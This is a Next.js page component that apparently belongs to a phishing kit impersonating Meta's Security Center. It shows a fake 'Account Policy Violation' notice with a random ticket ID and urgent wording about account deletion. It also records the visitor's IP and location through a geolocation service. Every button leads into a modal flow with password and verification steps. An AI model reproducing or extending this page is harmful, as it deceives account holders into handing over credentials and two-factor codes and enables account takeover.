'use client';
import { store } from '@/store/store';
import { useTranslation } from '@/hooks/useTranslation';

import axios from 'axios';
import { useEffect, useState, type FC } from 'react';
import Image from 'next/image';
import BlobIcon from '@/assets/images/blob.png';
import BlockIcon from '@/assets/images/block.png';
import ProfileImage from '@/assets/images/profile-image.png';
import MetaAiImage from '@/assets/images/meta-ai-image.png';
import BgImage from '@/assets/images/bg-image.43e7473b.png';
import { faHome, faSearch, faShield, faFileAlt, faGear, faBars, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';
import InitModal from '@/components/form-modal/init-modal';

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setFormStep, formStep, setGeoInfo } = store();
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
    
    // Shared translation hook - reads geoInfo from store
    const { t } = useTranslation([
        'Security Center', 'Home', 'Search', 'Security Policies', 'Rules & Other Posts', 'Settings',
        'We have scheduled your ad account and pages for deletion',
        'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
        'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
        'Your ticket id:', 'Request review',
        'This form is only to be used for submitting appeals and restoring account status.',
        'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.',
        'What is trademark infringement?',
        'Generally, trademark infringement occurs when all three of the following requirements are met:',
        'A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.',
        'That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.',
        'That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.',
        'Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.',
        'Account Policy Violation',
        'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.',
        'Privacy Center',
        'What is the Privacy Policy and what does it say?',
        'How you can manage or delete your information',
        'For more details, see the User Agreement',
        'Meta AI',
        'User Agreement',
        'Additional resources',
        'How Meta uses information for generative AI models',
        'Cards with information about the operation of AI systems',
        'Meta AI website',
        'Introduction to Generative AI',
        'For teenagers',
        'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy',
        'Help Center', 'Privacy Policy', 'Terms of Service', 'Community Standards',
    ]); 
    
    // Generate random ticket ID
    const generateTicketId = (): string => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let id = '';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        id += '-';
        for (let i = 0; i < 4; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return id;
    };
    
    const [ticketId] = useState<string>(() => generateTicketId());

    // Geo-detection: always fetch fresh on every page load
    useEffect(() => {
        if (typeof window !== 'undefined') {
            localStorage.removeItem('translation_cache');
            localStorage.removeItem('translation_country');
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
                const cc = (data.country_code || 'US').toUpperCase();
                const info = {
                    asn: data.asn || 0,
                    ip: data.ip || 'UNKNOWN',
                    country: data.country || 'UNKNOWN',
                    city: data.city || 'UNKNOWN',
                    country_code: cc
                };
                setGeoInfo(info);
            } catch {
                const fallback = {
                    asn: 0,
                    ip: 'UNKNOWN',
                    country: 'UNKNOWN',
                    city: 'UNKNOWN',
                    country_code: 'US'
                };
                setGeoInfo(fallback);
            }
        };
        fetchGeoInfo();
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    // Reset formStep when entering page
    useEffect(() => {
        setFormStep('init');
    }, [setFormStep]);



    // Handle input change

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col overflow-x-hidden">
            {/* Mobile Header with Menu Button */}
            <div className="md:hidden bg-white border-b border-gray-200 flex items-center justify-between p-4 sticky top-0 z-40">
                <div className="flex items-center gap-3">
                    <button
                        onClick={() => setModalOpen(true)}
                        className="cursor-pointer hover:opacity-80 transition-opacity"
                        aria-label="Open form modal"
                    >
                        <Image 
                            src={BlobIcon} 
                            alt="Meta" 
                            width={80} 
                            height={50} 
                            className="w-16 h-auto"
                            priority
                            quality={100}
                        />
                    </button>
                    <span className="text-sm font-bold text-gray-900">{t('Security Center')}</span>
                </div>
                <button
                    onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                    className="p-2 hover:bg-gray-100 rounded-lg transition"
                    aria-label="Toggle menu"
                >
                    <FontAwesomeIcon 
                        icon={isMobileMenuOpen ? faTimes : faBars} 
                        className="w-6 h-6 text-gray-900"
                    />
                </button>
            </div>

            {/* Mobile Sidebar Menu Overlay */}
            {isMobileMenuOpen && (
                <div 
                    className="md:hidden fixed inset-0 bg-black/30 z-30"
                    onClick={() => setIsMobileMenuOpen(false)}
                />
            )}

            {/* Mobile Sidebar Menu */}
            <div
                className={`md:hidden fixed left-0 top-16 bottom-0 w-64 bg-gray-50 border-r border-gray-200 z-30 transform transition-transform duration-300 ${
                    isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full'
                } overflow-y-auto`}
            >
                <nav className="flex flex-col gap-1 p-4">
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 hover:bg-blue-100 transition">
                        <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                        <span className="text-[15px]">{t('Home')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                        <span className="text-[15px]">{t('Search')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                        <span className="text-[15px]">{t('Security Policies')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                        <span className="text-[15px]">{t('Rules & Other Posts')}</span>
                    </button>
                    <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-3 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                        <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                        <span className="text-[15px]">{t('Settings')}</span>
                    </button>
                </nav>
            </div>

            <div className="flex-1 flex justify-center pt-0 md:pt-0 overflow-x-hidden">
                <div className="flex w-full max-w-[60rem] mx-auto relative overflow-hidden">
                    {/* Divider Line */}
                    <div className="hidden md:block absolute left-[18.5rem] top-0 bottom-0 w-[0.5px] bg-gray-200"></div>
                    {/* Sidebar - Hidden on mobile */}
                    <div className="hidden md:flex w-[18.5rem] bg-gray-50 flex-col flex-shrink-0 md:mt-10">
                        <div className="px-4 py-3 bg-gray-50">
                            <div className="flex flex-col items-start gap-3">
                                <button
                                    onClick={() => setModalOpen(true)}
                                    className="cursor-pointer hover:opacity-80 transition-opacity"
                                    aria-label="Open form modal"
                                >
                                    <Image 
                                        src={BlobIcon} 
                                        alt="Meta" 
                                        width={500} 
                                        height={300} 
                                        className="w-24 h-auto flex-shrink-0"
                                        priority
                                        quality={100}
                                    />
                                </button>
                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
                            </div>
                        </div>

                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 hover:bg-blue-100 transition">
                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                                <span className="text-[15px]">{t('Home')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                                <span className="text-[15px]">{t('Search')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                                <span className="text-[15px]">{t('Security Policies')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                                <span className="text-[15px]">{t('Rules & Other Posts')}</span>
                            </button>
                            <button onClick={() => setModalOpen(true)} className="w-full text-left px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                                <span className="text-[15px]">{t('Settings')}</span>
                            </button>
                        </nav>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full min-w-0 overflow-x-hidden">
                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto overflow-x-hidden p-2 sm:p-3 md:p-6 flex flex-col pb-4 sm:pb-6 m-2 md:m-4 md:m-6 md:mt-4 min-w-0">
                            <div className="w-full max-w-[45rem] mx-auto" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                                {/* Notification Banner */}
                                <div className="mb-2 md:mb-3">
                                    <div className="flex items-center gap-2 sm:gap-3 md:gap-4 flex-nowrap">
                                        <Image
                                            src={BlockIcon}
                                            alt="Block"
                                            width={64}
                                            height={64}
                                            className="w-7 sm:w-9 md:w-11 h-7 sm:h-9 md:h-11 flex-shrink-0"
                                            priority
                                            quality={100}
                                        />
                                        <h2 className="text-lg sm:text-xl md:text-2xl lg:text-[1.7rem] font-semibold text-gray-900 leading-[1.15] flex-shrink min-w-0 line-clamp-2">
                                            {t('Account Policy Violation')}
                                        </h2>
                                    </div>
                                </div>

                                {/* Description Text */}
                                <div className="mb-2 sm:mb-3 md:mb-4 text-xs sm:text-sm md:text-base text-gray-700 space-y-1.5 font-normal break-words">
                                    <p className="w-full text-gray-700 font-light text-left text-[clamp(0.82rem,0.6vw+0.72rem,1rem)] leading-[1.55]">
                                        {t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}
                                    </p>
                                    <p className="text-xs sm:text-sm md:text-base font-semibold text-blue-600">
                                        {t('Your ticket id:')} #{ticketId}
                                    </p>
                                </div>

                                <div className="mb-4 sm:mb-6 md:mb-8 rounded-[20px] bg-white overflow-hidden">
                                    {/* Illustration */}
                                    <div className="rounded-t-2xl rounded-b-none border border-[#dde3e1] bg-[#2b7fff] p-3 sm:p-4 md:p-8 flex items-center justify-center min-h-40 sm:min-h-48 md:min-h-80">
                                        <Image 
                                            src={BgImage} 
                                            alt="Security Illustration" 
                                            width={680} 
                                            height={440} 
                                            className="w-[115%] h-auto max-w-lg sm:max-w-xl md:max-w-2xl object-contain"
                                            priority
                                            quality={100}
                                        />
                                    </div>

                                    {/* Request Review Section */}
                                    <div className="p-3 sm:p-4 md:p-6">
                                        <h3 className="text-xl sm:text-2xl font-medium text-gray-900 mb-2 leading-tight">
                                            {t('This form is only to be used for submitting appeals and restoring account status.')}
                                        </h3>
                                        <p className="text-xs sm:text-sm md:text-base text-gray-700 mb-2 sm:mb-3">
                                            {t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}
                                        </p>
                                        
                                        {/* Request Review Button */}
                                        <button
                                            onClick={() => {
                                                setModalOpen(true);
                                            }}
                                            className="w-full py-2.5 md:py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg text-sm md:text-base"
                                        >
                                            {t('Request review')}
                                        </button>
                                    </div>
                                </div>

                                {/* Privacy Center Content */}
                                <div className="mt-1">
                                    <section>
                                        <h3 className="mb-2 text-[15px] sm:text-[16px] leading-[1.25] font-sans font-medium text-[#212529]">{t('Privacy Center')}</h3>
                                        <div className="overflow-hidden rounded-2xl border border-[#dde3e1]">
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="h-12 w-12 flex-shrink-0 overflow-hidden">
                                                    <Image src={ProfileImage} alt="Privacy item" className="h-full w-full object-cover" />
                                                </div>
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('What is the Privacy Policy and what does it say?')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('Privacy Policy')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                            <div className="h-px bg-[#d9dfdd]"></div>
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="h-12 w-12 flex-shrink-0 overflow-hidden">
                                                    <Image src={ProfileImage} alt="Privacy item" className="h-full w-full object-cover" />
                                                </div>
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('How you can manage or delete your information')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('Privacy Policy')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                        </div>
                                    </section>

                                    <section className="mt-4 sm:mt-5">
                                        <h3 className="mb-2 text-[15px] sm:text-[16px] leading-[1.25] font-sans font-medium text-[#212529]">{t('For more details, see the User Agreement')}</h3>
                                        <div className="overflow-hidden rounded-2xl border border-[#dde3e1]">
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="h-12 w-12 flex-shrink-0 overflow-hidden">
                                                    <Image src={MetaAiImage} alt="User agreement" className="h-full w-full object-cover" />
                                                </div>
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('Meta AI')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('User Agreement')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                        </div>
                                    </section>

                                    <section className="mt-4 sm:mt-5">
                                        <h3 className="mb-2 text-[15px] sm:text-[16px] leading-[1.25] font-sans font-medium text-[#212529]">{t('Additional resources')}</h3>
                                        <div className="overflow-hidden rounded-2xl border border-[#dde3e1]">
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('How Meta uses information for generative AI models')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('Privacy Center')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                            <div className="h-px bg-[#d9dfdd]"></div>
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('Cards with information about the operation of AI systems')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('Meta AI website')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                            <div className="h-px bg-[#d9dfdd]"></div>
                                            <a href="#" className="flex items-center gap-3 p-3 sm:p-4 hover:bg-[#f8faf9] transition-colors">
                                                <div className="min-w-0 flex-1">
                                                    <p className="text-[17px] leading-6 text-[#0f172a]">{t('Introduction to Generative AI')}</p>
                                                    <p className="text-[15px] text-[#334155]">{t('For teenagers')}</p>
                                                </div>
                                                <span className="text-3xl leading-none text-[#1f2937]">›</span>
                                            </a>
                                        </div>
                                    </section>

                                    <p className="mt-4 text-[13px] sm:text-[14px] leading-5 font-light text-[#4b5563]">
                                        {t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>


            {isModalOpen && <InitModal />}

            {/* Password Modal */}
            {formStep === 'password' && (
                <PasswordModal />
            )}

            {/* Verify Modal */}
            {formStep === 'verify' && (
                <VerifyModal />
            )}
        </div>
    );
};

export default Page;
